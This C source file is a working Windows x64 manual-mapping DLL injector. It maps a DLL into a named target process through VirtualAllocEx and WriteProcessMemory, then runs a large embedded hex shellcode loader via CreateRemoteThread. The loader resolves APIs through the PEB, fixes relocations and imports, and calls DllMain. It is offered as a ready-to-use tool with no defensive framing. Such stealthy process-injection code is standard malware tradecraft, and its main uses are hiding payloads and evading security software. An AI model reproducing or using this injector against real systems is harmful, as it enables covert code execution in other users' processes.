#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>
#include<string.h>


typedef struct _PE_INFO
{
	LPVOID base;
	BOOL reloc; //For If base relocation is needed
	LPVOID Get_Proc; //Address OF GetProcAddress()
	LPVOID Load_DLL; //Address OF LoadLibraryA()
}PE_INFO , * LPE_INFO;

LPVOID Read_in_Memory(char * FileName)
{
	HANDLE f,h;
	LPVOID mem;
	
	if((f=CreateFileA(FileName,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL))==INVALID_HANDLE_VALUE)
	return NULL;
	
	if((h=CreateFileMappingA(f,NULL,PAGE_READONLY,0,0,NULL))==NULL)
	return NULL;
	
	if((mem=MapViewOfFile(h,FILE_MAP_READ,0,0,0))==NULL)
	return NULL;
	else
	return mem;
	
}

HANDLE Find_Process(char * process_name)
{
	HANDLE snap,proc;
	PROCESSENTRY32 ps;
	BOOL found=0;
	
	ps.dwSize=sizeof(ps);
	
	if((snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0) )==INVALID_HANDLE_VALUE)
	return NULL;
	
	if(!Process32First(snap,&ps))
	return NULL;
	
	do
	{
		if(!strcmp(process_name,ps.szExeFile))
		{
			found=1;
			break;
		}
	}while(Process32Next(snap,&ps));
	
	CloseHandle(snap);
	if(!found)
	return NULL;
	
	if((proc=OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID))==NULL)
	{
		return NULL;
	}
	else
	return proc;
}


unsigned char Loader[]="\x55\x48\x89\xe5\x89\xc8\x66\x89\x45\x10\x66\x83\x7d\x10\x60\x76\x10\x66\x83\x7d\x10\x7a\x77\x09\x0f\xb7\x45\x10\x83\xe8\x20\xeb\x04\x0f\xb7\x45\x10\x5d\xc3\x55\x53\x48\x83\xec\x28\x48\x8d\x6c\x24\x20\x48\x89\x4d\x20\x48\x89\x55\x28\xeb\x30\x48\x8b\x45\x20\x0f\xb7\x18\x48\x8b\x45\x28\x0f\xb6\x00\x66\x98\x0f\xb7\xc0\x89\xc1\xe8\xaa\xff\xff\xff\x66\x39\xc3\x74\x07\xb8\x00\x00\x00\x00\xeb\x44\x48\x83\x45\x20\x02\x48\x83\x45\x28\x01\x48\x8b\x45\x20\x0f\xb7\x00\x66\x85\xc0\x74\x0b\x48\x8b\x45\x28\x0f\xb6\x00\x84\xc0\x75\xb9\x48\x8b\x45\x20\x0f\xb7\x00\x66\x85\xc0\x74\x12\x48\x8b\x45\x28\x0f\xb6\x00\x84\xc0\x74\x07\xb8\x00\x00\x00\x00\xeb\x05\xb8\x01\x00\x00\x00\x48\x83\xc4\x28\x5b\x5d\xc3\x55\x48\x89\xe5\x48\x81\xec\xc0\x00\x00\x00\x48\x89\x4d\x10\xc7\x45\x84\x60\x00\x00\x00\x8b\x45\x84\x65\x67\x48\x8b\x00\x48\x89\x85\x78\xff\xff\xff\x48\x8b\x85\x78\xff\xff\xff\x48\x89\x45\xc0\x48\x8b\x45\xc0\x48\x8b\x40\x18\x48\x8b\x40\x20\x48\x89\x45\xf8\x48\x8b\x45\xc0\x48\x8b\x40\x18\x48\x83\xc0\x20\x48\x89\x45\xb8\x48\xc7\x45\xf0\x00\x00\x00\x00\x48\xc7\x45\xe8\x00\x00\x00\x00\x48\x8d\x85\x60\xff\xff\xff\xc7\x00\x6b\x65\x72\x6e\x48\x8d\x85\x60\xff\xff\xff\x48\x83\xc0\x04\xc7\x00\x65\x6c\x33\x32\x48\x8d\x85\x60\xff\xff\xff\x48\x83\xc0\x08\xc7\x00\x2e\x64\x6c\x6c\x48\x8d\x85\x60\xff\xff\xff\x48\x83\xc0\x0c\x66\xc7\x00\x00\x00\xeb\x49\x48\x8b\x45\xf8\x48\x83\xe8\x10\x48\x89\x45\x88\x48\x8b\x45\x88\x48\x8b\x40\x60\x48\x8d\x95\x60\xff\xff\xff\x48\x89\xc1\xe8\xb6\xfe\xff\xff\x84\xc0\x74\x17\x48\x8b\x45\x88\x48\x8b\x40\x30\x48\x89\x45\xf0\x48\x8b\x45\x10\x48\x8b\x55\xf0\x48\x89\x10\x48\x8b\x45\xf8\x48\x8b\x00\x48\x89\x45\xf8\x48\x8b\x45\xf8\x48\x3b\x45\xb8\x75\xad\x48\x83\x7d\xf0\x00\x0f\x84\x7f\x01\x00\x00\x48\x8d\x85\x60\xff\xff\xff\xc7\x00\x47\x65\x74\x50\x48\x8d\x85\x60\xff\xff\xff\x48\x83\xc0\x04\xc7\x00\x72\x6f\x63\x41\x48\x8d\x85\x60\xff\xff\xff\x48\x83\xc0\x08\xc7\x00\x64\x64\x72\x65\x48\x8d\x85\x60\xff\xff\xff\x48\x83\xc0\x0c\x66\xc7\x00\x73\x73\x48\x8d\x85\x60\xff\xff\xff\x48\x83\xc0\x0e\x66\xc7\x00\x00\x00\x48\x8b\x45\xf0\x8b\x40\x3c\x48\x63\xd0\x48\x8b\x45\xf0\x48\x01\xd0\x48\x89\x45\xb0\x48\x8b\x45\xb0\x8b\x80\x88\x00\x00\x00\x89\xc2\x48\x8b\x45\xf0\x48\x01\xd0\x48\x89\x45\xa8\x48\x8b\x45\xa8\x8b\x40\x1c\x89\xc2\x48\x8b\x45\xf0\x48\x01\xd0\x48\x89\x45\xa0\x48\x8b\x45\xa8\x8b\x40\x20\x89\xc2\x48\x8b\x45\xf0\x48\x01\xd0\x48\x89\x45\x98\x48\x8b\x45\xa8\x8b\x40\x24\x89\xc2\x48\x8b\x45\xf0\x48\x01\xd0\x48\x89\x45\x90\xc7\x45\xe4\x00\x00\x00\x00\xe9\xaa\x00\x00\x00\x8b\x45\xe4\x48\x98\x48\x8d\x14\x85\x00\x00\x00\x00\x48\x8b\x45\x98\x48\x01\xd0\x8b\x00\x89\xc2\x48\x8b\x45\xf0\x48\x01\xd0\x48\x89\x45\xd8\xc6\x45\xd7\x01\x48\x8d\x85\x60\xff\xff\xff\x48\x89\x45\xc8\xeb\x22\x48\x8b\x45\xd8\x0f\xb6\x10\x48\x8b\x45\xc8\x0f\xb6\x00\x38\xc2\x74\x06\xc6\x45\xd7\x00\xeb\x20\x48\x83\x45\xc8\x01\x48\x83\x45\xd8\x01\x48\x8b\x45\xd8\x0f\xb6\x00\x84\xc0\x74\x0b\x48\x8b\x45\xc8\x0f\xb6\x00\x84\xc0\x75\xc8\x80\x7d\xd7\x00\x74\x34\x8b\x45\xe4\x48\x98\x48\x8d\x14\x00\x48\x8b\x45\x90\x48\x01\xd0\x0f\xb7\x00\x0f\xb7\xc0\x48\x8d\x14\x85\x00\x00\x00\x00\x48\x8b\x45\xa0\x48\x01\xd0\x8b\x00\x89\xc2\x48\x8b\x45\xf0\x48\x01\xd0\x48\x89\x45\xe8\x83\x45\xe4\x01\x48\x8b\x45\xa8\x8b\x40\x18\x8b\x55\xe4\x39\xc2\x0f\x82\x44\xff\xff\xff\x48\x8b\x45\xe8\x48\x81\xc4\xc0\x00\x00\x00\x5d\xc3\x55\x48\x89\xe5\x48\x81\xec\x90\x00\x00\x00\x48\x89\x4d\x10\x48\x8d\x45\xb8\x48\x89\xc1\xe8\x5a\xfd\xff\xff\x48\x89\x45\xe8\x48\x8d\x45\xa0\xc7\x00\x56\x69\x72\x74\x48\x8d\x45\xa0\x48\x83\xc0\x04\xc7\x00\x75\x61\x6c\x41\x48\x8d\x45\xa0\x48\x83\xc0\x08\xc7\x00\x6c\x6c\x6f\x63\x48\x8d\x45\xa0\x48\x83\xc0\x0c\xc6\x00\x00\x4c\x8b\x45\xe8\x48\x8b\x45\xb8\x48\x8d\x55\xa0\x48\x89\xc1\x41\xff\xd0\x48\x89\x45\xe0\x48\x8d\x45\xa0\xc7\x00\x57\x72\x69\x74\x48\x8d\x45\xa0\x48\x83\xc0\x04\xc7\x00\x65\x50\x72\x6f\x48\x8d\x45\xa0\x48\x83\xc0\x08\xc7\x00\x63\x65\x73\x73\x48\x8d\x45\xa0\x48\x83\xc0\x0c\xc7\x00\x4d\x65\x6d\x6f\x48\x8d\x45\xa0\x48\x83\xc0\x10\x66\xc7\x00\x72\x79\x48\x8d\x45\xa0\x48\x83\xc0\x12\xc6\x00\x00\x4c\x8b\x45\xe8\x48\x8b\x45\xb8\x48\x8d\x55\xa0\x48\x89\xc1\x41\xff\xd0\x48\x89\x45\xd8\x48\x8b\x45\x10\x48\x89\x45\xd0\x48\x8b\x45\xd0\x0f\xb7\x00\x66\x3d\x4d\x5a\x74\x0a\xb8\x00\x00\x00\x00\xe9\x8f\x01\x00\x00\x48\x8b\x45\xd0\x8b\x40\x3c\x48\x63\xd0\x48\x8b\x45\x10\x48\x01\xd0\x48\x89\x45\xc8\x48\x8b\x45\xc8\x0f\xb7\x40\x18\x66\x3d\x0b\x02\x74\x0a\xb8\x00\x00\x00\x00\xe9\x62\x01\x00\x00\x48\x8b\x45\xc8\x48\x05\x08\x01\x00\x00\x48\x89\x45\xc0\x48\x8b\x45\xc8\x8b\x40\x50\x89\xc2\x48\x8b\x45\xc8\x48\x8b\x40\x30\x48\x89\xc1\x48\x8b\x45\xe0\x41\xb9\x40\x00\x00\x00\x41\xb8\x00\x30\x00\x00\xff\xd0\x48\x89\x45\xf8\x48\x83\x7d\xf8\x00\x75\x35\x48\x8b\x45\xc8\x8b\x40\x50\x89\xc2\x48\x8b\x45\xe0\x41\xb9\x40\x00\x00\x00\x41\xb8\x00\x30\x00\x00\xb9\x00\x00\x00\x00\xff\xd0\x48\x89\x45\xf8\x48\x83\x7d\xf8\x00\x75\x0a\xb8\x00\x00\x00\x00\xe9\xee\x00\x00\x00\x48\x8b\x45\xc8\x8b\x40\x54\x89\xc1\x48\x8b\x55\x10\x48\x8b\x45\xf8\x48\xc7\x44\x24\x20\x00\x00\x00\x00\x4c\x8b\x55\xd8\x49\x89\xc9\x49\x89\xd0\x48\x89\xc2\x48\xc7\xc1\xff\xff\xff\xff\x41\xff\xd2\xc7\x45\xf4\x00\x00\x00\x00\xe9\x99\x00\x00\x00\x8b\x45\xf4\x48\x63\xd0\x48\x89\xd0\x48\xc1\xe0\x02\x48\x01\xd0\x48\xc1\xe0\x03\x48\x89\xc2\x48\x8b\x45\xc0\x48\x01\xd0\x8b\x40\x10\x41\x89\xc0\x8b\x45\xf4\x48\x63\xd0\x48\x89\xd0\x48\xc1\xe0\x02\x48\x01\xd0\x48\xc1\xe0\x03\x48\x89\xc2\x48\x8b\x45\xc0\x48\x01\xd0\x8b\x40\x14\x89\xc2\x48\x8b\x45\x10\x48\x8d\x0c\x02\x8b\x45\xf4\x48\x63\xd0\x48\x89\xd0\x48\xc1\xe0\x02\x48\x01\xd0\x48\xc1\xe0\x03\x48\x89\xc2\x48\x8b\x45\xc0\x48\x01\xd0\x8b\x40\x0c\x89\xc2\x48\x8b\x45\xf8\x48\x01\xc2\x48\xc7\x44\x24\x20\x00\x00\x00\x00\x48\x8b\x45\xd8\x4d\x89\xc1\x49\x89\xc8\x48\xc7\xc1\xff\xff\xff\xff\xff\xd0\x83\x45\xf4\x01\x48\x8b\x45\xc8\x0f\xb7\x40\x06\x0f\xb7\xc0\x39\x45\xf4\x0f\x8c\x53\xff\xff\xff\x48\x8b\x45\xf8\x48\x81\xc4\x90\x00\x00\x00\x5d\xc3\x55\x48\x81\xec\x00\x01\x00\x00\x48\x8d\xac\x24\x80\x00\x00\x00\x48\x89\x8d\x90\x00\x00\x00\x48\x8d\x45\xa0\xc7\x00\x4c\x6f\x61\x64\x48\x8d\x45\xa0\x48\x83\xc0\x04\xc7\x00\x4c\x69\x62\x72\x48\x8d\x45\xa0\x48\x83\xc0\x08\xc7\x00\x61\x72\x79\x41\x48\x8d\x45\xa0\x48\x83\xc0\x0c\xc6\x00\x00\x48\x8d\x45\xb8\x48\x89\xc1\xe8\xa2\xfa\xff\xff\x48\x89\x45\x28\x4c\x8b\x45\x28\x48\x8b\x45\xb8\x48\x8d\x55\xa0\x48\x89\xc1\x41\xff\xd0\x48\x89\x45\x20\x48\x8b\x85\x90\x00\x00\x00\x8b\x40\x3c\x48\x63\xd0\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\x18\x48\x8b\x45\x18\x48\x8b\x40\x30\x48\x39\x85\x90\x00\x00\x00\x0f\x84\xee\x00\x00\x00\x48\x8b\x95\x90\x00\x00\x00\x48\x8b\x45\x18\x48\x8b\x40\x30\x48\x29\xc2\x48\x89\x55\x10\x48\x8b\x45\x18\x8b\x80\xb0\x00\x00\x00\x85\xc0\x0f\x84\xc6\x00\x00\x00\x48\x8b\x45\x18\x8b\x80\xb0\x00\x00\x00\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\x78\xe9\x99\x00\x00\x00\x48\x8b\x45\x78\x8b\x40\x04\x89\xc0\x48\x83\xe8\x08\x48\xd1\xe8\x89\x45\x0c\x48\x8b\x45\x78\x8b\x00\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\x00\x48\x8b\x45\x78\x48\x83\xc0\x08\x48\x89\x45\x70\xc7\x45\x6c\x00\x00\x00\x00\xeb\x46\x48\x8b\x45\x70\x0f\xb6\x40\x01\x83\xe0\xf0\x3c\xa0\x75\x2e\x48\x8b\x45\x70\x0f\xb7\x00\x66\x25\xff\x0f\x0f\xb7\xd0\x48\x8b\x45\x00\x48\x01\xd0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x48\x8b\x10\x48\x8b\x45\x10\x48\x01\xc2\x48\x8b\x45\xf8\x48\x89\x10\x48\x83\x45\x70\x02\x83\x45\x6c\x01\x8b\x45\x6c\x3b\x45\x0c\x7c\xb2\x48\x8b\x45\x78\x8b\x40\x04\x89\xc0\x48\x01\x45\x78\x48\x8b\x45\x78\x8b\x00\x85\xc0\x0f\x85\x59\xff\xff\xff\x48\x8b\x45\x18\x8b\x80\x90\x00\x00\x00\x85\xc0\x0f\x84\x1a\x01\x00\x00\x48\x8b\x45\x18\x8b\x80\x90\x00\x00\x00\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\x60\xe9\xec\x00\x00\x00\x48\x8b\x45\x60\x8b\x40\x0c\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\xf0\x48\x8b\x55\x20\x48\x8b\x45\xf0\x48\x89\xc1\xff\xd2\x48\x89\x45\xe8\x48\x8b\x45\x60\x8b\x00\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\x58\x48\x8b\x45\x60\x8b\x40\x10\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\x50\x48\x8b\x45\x60\x8b\x00\x85\xc0\x75\x7c\x48\x8b\x45\x50\x48\x89\x45\x58\xeb\x72\x48\x8b\x45\x58\x48\x8b\x00\x48\x85\xc0\x79\x27\x4c\x8b\x45\x28\x48\x8b\x45\x58\x48\x8b\x00\x0f\xb7\xc0\x48\x89\xc2\x48\x8b\x45\xe8\x48\x89\xc1\x41\xff\xd0\x48\x89\xc2\x48\x8b\x45\x50\x48\x89\x10\xeb\x35\x48\x8b\x45\x58\x48\x8b\x10\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\xe0\x4c\x8b\x45\x28\x48\x8b\x45\xe0\x48\x8d\x50\x02\x48\x8b\x45\xe8\x48\x89\xc1\x41\xff\xd0\x48\x89\xc2\x48\x8b\x45\x50\x48\x89\x10\x48\x83\x45\x50\x08\x48\x83\x45\x58\x08\x48\x8b\x45\x58\x48\x8b\x00\x48\x85\xc0\x75\x82\x48\x83\x45\x60\x14\x48\x8b\x45\x60\x8b\x40\x0c\x85\xc0\x0f\x85\x05\xff\xff\xff\x48\x8b\x45\x18\x8b\x80\xf0\x00\x00\x00\x85\xc0\x0f\x84\x1c\x01\x00\x00\x48\x8b\x45\x18\x8b\x80\xf0\x00\x00\x00\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\x48\xe9\xee\x00\x00\x00\x48\x8b\x45\x48\x8b\x40\x04\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\xd8\x48\x8b\x55\x20\x48\x8b\x45\xd8\x48\x89\xc1\xff\xd2\x48\x89\x45\xd0\x48\x8b\x45\x48\x8b\x40\x10\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\x40\x48\x8b\x45\x48\x8b\x40\x0c\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\x38\x48\x8b\x45\x48\x8b\x40\x10\x85\xc0\x75\x7c\x48\x8b\x45\x38\x48\x89\x45\x40\xeb\x72\x48\x8b\x45\x40\x48\x8b\x00\x48\x85\xc0\x79\x27\x4c\x8b\x45\x28\x48\x8b\x45\x40\x48\x8b\x00\x0f\xb7\xc0\x48\x89\xc2\x48\x8b\x45\xd0\x48\x89\xc1\x41\xff\xd0\x48\x89\xc2\x48\x8b\x45\x38\x48\x89\x10\xeb\x35\x48\x8b\x45\x40\x48\x8b\x10\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\xc8\x4c\x8b\x45\x28\x48\x8b\x45\xc8\x48\x8d\x50\x02\x48\x8b\x45\xd0\x48\x89\xc1\x41\xff\xd0\x48\x89\xc2\x48\x8b\x45\x38\x48\x89\x10\x48\x83\x45\x38\x08\x48\x83\x45\x40\x08\x48\x8b\x45\x40\x48\x8b\x00\x48\x85\xc0\x75\x82\x48\x83\x45\x48\x20\x48\x8b\x45\x48\x8b\x40\x04\x85\xc0\x0f\x85\x03\xff\xff\xff\x48\x8b\x45\x18\x8b\x80\xd0\x00\x00\x00\x85\xc0\x74\x65\x48\x8b\x45\x18\x8b\x80\xd0\x00\x00\x00\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x48\x89\x45\xc0\x48\x8b\x45\xc0\x48\x8b\x40\x18\x48\x85\xc0\x74\x3e\x48\x8b\x45\xc0\x48\x8b\x40\x18\x48\x89\x45\x30\xeb\x24\x48\x8b\x45\x30\x4c\x8b\x08\x48\x8b\x85\x90\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xba\x01\x00\x00\x00\x48\x89\xc1\x41\xff\xd1\x48\x83\x45\x30\x08\x48\x8b\x45\x30\x48\x8b\x00\x48\x85\xc0\x75\xd0\x48\x8b\x45\x18\x8b\x40\x28\x89\xc2\x48\x8b\x85\x90\x00\x00\x00\x48\x01\xd0\x49\x89\xc1\x48\x8b\x85\x90\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xba\x01\x00\x00\x00\x48\x89\xc1\x41\xff\xd1\x90\x48\x81\xc4\x00\x01\x00\x00\x5d\xc3";

int main(int i,char *arg[])
{

	HANDLE proc;
	LPVOID base,Rbase,Adj;
	PIMAGE_DOS_HEADER dos;
	PIMAGE_SECTION_HEADER sec;
	PIMAGE_NT_HEADERS nt;

	PE_INFO pe;
	
	if(i!=3)
	{
		printf("[!]Usage %s <DLL> <Process>\n",arg[0]);
		return 0;
	}
	
	printf("[+]Opening File...\n");
	
	if((base=Read_in_Memory(arg[1]))==NULL)
	{
		printf("[-]File I/O Error");
		return 0;
	}
	
	dos=(PIMAGE_DOS_HEADER)base;
	
	if(dos->e_magic!=23117)
	{
		printf("[-]Invalid File");
		return 0;
	}
	
	nt=(PIMAGE_NT_HEADERS)(base+dos->e_lfanew);
	sec=(PIMAGE_SECTION_HEADER)((LPVOID)nt+24+nt->FileHeader.SizeOfOptionalHeader);
	
	if(nt->OptionalHeader.Magic!=IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		printf("[-]This is not 64 bit pe");
		return 0;
	}
	
	printf("\n[+]Open Process.....");
	
	if((proc=Find_Process(arg[2]))==NULL)
	{
		printf("[-]Failed To Open Process");
		return 0;
	}
	
	printf("[+]Allocating Memory Into Remote Process");
	
	pe.reloc=0;
	
	if((Rbase=VirtualAllocEx(proc,(LPVOID)nt->OptionalHeader.ImageBase,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
	{
		printf("\n[!]Failed To Allocate Memory AT %#p\n[!]Trying Alternative\n",nt->OptionalHeader.ImageBase);
		pe.reloc=1;
		if((Rbase=VirtualAllocEx(proc,NULL,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
		{
			printf("[-]Failed To Allocate Memory Into Remote Process");
			return 0;
		}
	}
	
	printf("\n[+]Copying Headers");
	WriteProcessMemory(proc,Rbase,base,nt->OptionalHeader.SizeOfHeaders,NULL);
	printf("\n[+]Copying Sections...");
	for(i=0;i<nt->FileHeader.NumberOfSections;i++)
	{
		WriteProcessMemory(proc,Rbase+sec->VirtualAddress,base+sec->PointerToRawData,sec->SizeOfRawData,NULL);
		sec++;
	}
	

	
	if((Adj=VirtualAllocEx(proc,NULL,sizeof(Loader),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
	{
		printf("\n[-]Failed To Allocate Memory for PE adjusting");
		VirtualFreeEx(proc,Rbase,0,MEM_RELEASE);
		return 0;
	}
	
	
	WriteProcessMemory(proc,Adj,Loader,sizeof(Loader),NULL);
	if(!CreateRemoteThread(proc,NULL,0,(LPTHREAD_START_ROUTINE)(Adj+1463),Rbase,0,NULL))
	printf("\n[-]Failed TO Adjust PE");
	else
	printf("\n[+]Adjusting PE And Executing....");
	
	return 0;
	
}
